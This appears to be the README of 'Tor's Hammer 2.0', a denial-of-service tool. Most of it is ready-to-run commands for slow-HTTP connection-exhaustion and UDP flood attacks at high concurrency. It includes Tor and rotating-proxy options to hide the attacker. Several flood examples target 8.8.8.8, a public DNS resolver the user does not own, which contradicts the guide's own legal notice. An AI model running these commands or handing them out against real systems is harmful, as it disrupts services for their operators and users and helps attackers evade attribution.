# How to Run Tor's Hammer 2.0 (Python & Rust)

Tor's Hammer 2.0 ships **two integrated runtimes** that work through a unified CLI:

| Runtime | Language | Location | Purpose | Status |
|---|---|---|---|---|
| Python backend | Python 3.11+ | `src/torshammer/` | Main attack tool with asyncio engine | **Production-ready** |
| Rust backend | Rust (edition 2021) | `rust/` | High-performance attack engine | **Production-ready** |

Both backends are **fully functional** and can be selected via the `--backend` flag in the unified CLI. Both support **real TCP/IP and UDP networking** with feature parity across all attack modes, including slow-post, slow-headers, chunked, slow-read, and UDP flood.

---

## Prerequisites

- **Python 3.11 or higher** — `python3 --version`
- **Rust toolchain** (for the Rust crate) — `cargo --version`
  - Install via [rustup](https://rustup.rs/) if needed:
    ```bash
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
    ```

> **Legal notice:** This is an authorized-security-testing tool. Only run it
> against systems you own or have explicit written authorization to test.

---

## Running the Python Tool

### 1. Create and activate a virtual environment

```bash
# From the repository root
python3 -m venv .venv
source .venv/bin/activate        # Linux / macOS
# .venv\Scripts\activate         # Windows
```

### 2. Install the package

```bash
pip install -e .                 # basic install
# OR, with development extras (pytest, mypy):
pip install -e ".[dev]"
```

### 3. Run it

Once installed you get the `torshammer` command. Both backends can be selected via the `--backend` flag:

```bash
# Default Python backend
torshammer -u http://localhost:8080

# Use Rust backend for better performance
torshammer -u http://localhost:8080 --backend rust

# Or run as Python module
python -m torshammer -u http://localhost:8080
python -m torshammer --backend rust -u http://localhost:8080
```

Useful examples:

```bash
# Classic slow POST, 256 concurrent sockets (Python backend)
torshammer -u http://example.com

# High-performance Rust backend with 1000 concurrent connections
torshammer -u http://example.com --backend rust -c 1000

# HTTPS with self-signed certs, slow-headers mode, higher concurrency
torshammer -u https://localhost:9443 -m slow-headers -c 512 --ssl-no-verify

# Rust backend with custom headers and automation
torshammer -u http://example.com --backend rust --header "X-Custom: test" --fail-under 50

# UDP flood mode (both backends support real UDP datagrams)
torshammer -m udp -u udp://8.8.8.8:53 -c 50 -d 30
torshammer -m udp -u udp://127.0.0.1:53 --backend rust -c 100 -d 60

# Chunked transfer encoding mode
torshammer -u http://example.com -m chunked -c 200

# Slow-read mode (consumes server response bandwidth)
torshammer -u http://example.com -m slow-read -c 150

# Anonymize via Tor (expect Tor on 127.0.0.1:9050)
torshammer -u http://localhost:8080 --tor

# Proxy rotation from a file
torshammer -u http://localhost:8080 --proxy-list examples/proxies.txt --rotate-proxies

# JSON statistics output redirected to a file
torshammer -u http://localhost:8080 --json > stats.log

# Performance comparison between backends
torshammer -u http://example.com -c 500 -d 10 --json > python_stats.json
torshammer -u http://example.com -c 500 -d 10 --backend rust --json > rust_stats.json

# UDP performance comparison
torshammer -m udp -u udp://target.com:53 -c 100 -d 20 --json > python_udp.json
torshammer -m udp -u udp://target.com:53 -c 100 -d 20 --backend rust --json > rust_udp.json
```

Stop the running scan at any time with **Ctrl-C**.

### 4. Running the Python tests

```bash
pytest                 # run the full suite
pytest -v              # verbose
pytest tests/test_cli.py   # a single test file
```

---

## Running the Rust Backend

The Rust backend is fully integrated into the unified CLI and provides enhanced performance for high-concurrency scenarios. It supports all the same features as the Python backend.

### 1. Build the Rust component

```bash
cd rust
cargo build --release  # optimized release build
```

The compiled Rust library will be available for the Python CLI to use.

### 2. Run via unified CLI

After building, you can use the Rust backend through the same Python CLI:

```bash
# Use Rust backend with unified CLI
python -m torshammer -u http://localhost:8080 --backend rust

# High-concurrency Rust testing
python -m torshammer -u http://example.com --backend rust -c 1000 -d 30
```

### 3. Performance comparison

```bash
# Test Python backend performance
python -m torshammer -u http://example.com -c 500 -d 10 --json

# Test Rust backend performance
python -m torshammer -u http://example.com -c 500 -d 10 --backend rust --json
```

### 4. Running Rust tests

```bash
cd rust
cargo test             # run unit tests
cargo clippy --all-targets -- -D warnings   # lint (strict)
cargo fmt -- --check   # formatting check
```

---

## Real Networking Implementation

Both backends use **actual network protocols** (not simulations):

### TCP/IP Networking
- **Python backend**: Uses `asyncio.open_connection()` with real TCP sockets
- **Rust backend**: Uses `std::net::TcpStream` with real TCP sockets
- Supports HTTP/HTTPS with proper TCP handshakes and connection management
- All TCP modes (slow-post, slow-headers, chunked, slow-read) use real network I/O

### UDP Networking
- **Python backend**: Uses `asyncio.DatagramProtocol` with real UDP sockets
- **Rust backend**: Uses `std::net::UdpSocket` with real UDP sockets
- UDP mode sends actual datagrams with real network transport
- Supports IPv4 and IPv6 addressing for both protocols

### Protocol Support

| Protocol | Python Backend | Rust Backend | Use Case |
|---|---|---|---|
| HTTP | ✅ | ✅ | Web servers, APIs, HTTP services |
| HTTPS | ✅ | ✅ | Secure web services, TLS-protected endpoints |
| UDP | ✅ | ✅ | DNS servers, UDP services, custom protocols |

### Attack Modes

| Mode | Protocol | Backend Support | Description |
|---|---|---|---|
| slow-post | TCP | Python + Rust | Sends partial POST data very slowly |
| slow-headers | TCP | Python + Rust | Sends HTTP headers at a trickle |
| chunked | TCP | Python + Rust | Uses chunked transfer encoding with delays |
| slow-read | TCP | Python + Rust | Consumes server response bandwidth slowly |
| udp | UDP | Python + Rust | Floods target with UDP datagrams |

---

## Choosing Between Python and Rust

Both backends are **production-ready** and offer the same feature set. The choice depends on your performance needs:

- **Use Python backend** for:
  - Maximum compatibility and debugging ease
  - Standard performance requirements (up to ~500 concurrent connections)
  - Easier troubleshooting and development
  - Default choice for most use cases

- **Use Rust backend** for:
  - Maximum performance with high concurrency (1000+ connections)
  - Better resource efficiency under heavy load
  - Lower memory footprint for large-scale testing
  - Production environments where performance is critical

**Performance Comparison:**
- Python: Excellent for typical testing scenarios (0-500 concurrent connections), full TCP/UDP support
- Rust: Optimized for high-load scenarios (500-5000+ concurrent connections), enhanced TCP/UDP performance
- Both support all attack modes (including UDP), proxies, TLS, and automation features
- Identical networking behavior: real TCP sockets and real UDP datagrams

**Unified CLI:** Simply add `--backend rust` to any command to switch backends:
```bash
# Same command, different backend
torshammer -u http://example.com -c 100           # Python
torshammer -u http://example.com -c 100 --backend rust  # Rust
```

---

## Performance Tips & Best Practices

### Python Backend Optimization
- Start with default concurrency (256) and increase gradually
- Use `--ramp-up` to stagger connections and avoid overwhelming the target
- Monitor JSON output for error rates and adjust accordingly
- For sustained testing, use `--max-errors` to auto-stop on persistent failures

### Rust Backend Optimization
- Ideal for high-concurrency scenarios (1000+ connections)
- Lower memory overhead allows for more concurrent connections
- Better performance under sustained load
- Use `--ramp-up` to prevent connection bursts

### General Recommendations
```bash
# Start with moderate settings (TCP mode)
torshammer -u http://example.com -c 100 -d 30

# Test UDP flood mode
torshammer -m udp -u udp://example.com:53 -c 50 -d 30

# Increase gradually if target handles load well
torshammer -u http://example.com -c 500 -d 60

# Use Rust for maximum load (TCP)
torshammer -u http://example.com -c 2000 -d 120 --backend rust

# Use Rust for maximum UDP load
torshammer -m udp -u udp://example.com:53 -c 500 -d 120 --backend rust
```

### Monitoring & Automation
```bash
# JSON output for monitoring and analysis
torshammer -u http://example.com --json | jq '.peak_active'

# CI/CD automation with exit codes
torshammer -u http://example.com --fail-under 50 --fail-on-zero

# Custom headers for testing specific endpoints
torshammer -u http://example.com --header "Authorization: Bearer token"

# UDP flood monitoring
torshammer -m udp -u udp://target.com:53 --json | jq '.bytes_sent'
```

---

## Attack Effectiveness

The attacks use **real network traffic** and will work against accessible targets under the right conditions.

### When Attacks Will Work

**Required Conditions:**
- Target must be reachable (network connectivity)
- Service must be running on target port
- Firewall must allow traffic to target
- Sufficient concurrency for effective resource consumption

**What Actually Happens:**
- **TCP Modes**: Real TCP handshakes, partial HTTP requests, connection resource consumption
- **UDP Mode**: Real UDP datagrams sent to target, network bandwidth consumption
- **Real Impact**: Server resources are actually consumed, not simulated

### Protocol-Specific Behavior

**TCP Attack Modes (slow-post, slow-headers, chunked, slow-read):**
- Opens real TCP connections to target:port
- Sends partial HTTP requests very slowly
- Keeps connections open and consuming server resources
- Works against web servers, APIs, HTTP services
- Can exhaust connection limits, memory, and processing capacity

**UDP Attack Mode:**
- Sends real UDP datagrams to target:port
- Sends 1-32 byte payloads with random delays
- Floods the target with datagram traffic
- Works against DNS servers, UDP services, any UDP port
- Can consume network bandwidth and processing resources

### Real-World Testing

```bash
# Test your own web server (http)
python -m torshammer -u http://your-server.com -c 100 -d 30

# Test HTTPS endpoint
python -m torshammer -u https://your-api.com/endpoint -c 200 -d 60 --backend rust

# Test DNS server (UDP)
python -m torshammer -m udp -u udp://8.8.8.8:53 -c 50 -d 20

# Test local development server
python -m torshammer -u http://localhost:3000 -c 50 -d 15

# Cross-backend UDP comparison
python -m torshammer -m udp -u udp://target.com:53 -c 100 -d 30 --backend python
python -m torshammer -m udp -u udp://target.com:53 -c 100 -d 30 --backend rust
```

### Important Notes

**The attacks ARE real network traffic:**
- Real TCP handshakes occur
- Real UDP datagrams are sent
- Real server resources are consumed
- Can impact actual services

**Effectiveness depends on:**
- Server configuration (timeouts, connection limits)
- Network bandwidth and latency
- Server hardware capacity
- Rate limiting and DDoS protection

**Legal & Ethical:**
- Only test systems you own or have explicit permission
- Never test public servers without authorization
- Start with low concurrency and monitor impact
- Be aware of potential consequences

---

## Quick Command Reference

```bash
# Installation
python3 -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"

# Build Rust backend (required before using Rust)
cd rust && cargo build --release && cd ..

# Python backend examples (TCP)
torshammer -u http://localhost:8080
python -m torshammer -u http://localhost:8080

# Python backend examples (UDP)
torshammer -m udp -u udp://127.0.0.1:53 -c 10 -d 5
python -m torshammer -m udp -u udp://8.8.8.8:53 -c 20 -d 10

# Rust backend examples (TCP)
torshammer -u http://localhost:8080 --backend rust
python -m torshammer -u http://localhost:8080 --backend rust -c 1000

# Rust backend examples (UDP)
torshammer -m udp -u udp://127.0.0.1:53 --backend rust -c 20 -d 5
python -m torshammer -m udp -u udp://8.8.8.8:53 --backend rust -c 50 -d 10

# Performance comparison (TCP)
torshammer -u http://example.com -c 500 -d 10 --json > python_tcp.json
torshammer -u http://example.com -c 500 -d 10 --backend rust --json > rust_tcp.json

# Performance comparison (UDP)
torshammer -m udp -u udp://example.com:53 -c 100 -d 10 --json > python_udp.json
torshammer -m udp -u udp://example.com:53 -c 100 -d 10 --backend rust --json > rust_udp.json

# Different attack modes
torshammer -u http://example.com -m slow-headers -c 200
torshammer -u http://example.com -m chunked -c 300 --backend rust
torshammer -u http://example.com -m slow-read -c 150

# Tests
pytest                           # Python tests
cd rust && cargo test            # Rust tests
cd rust && cargo clippy          # Rust linting
```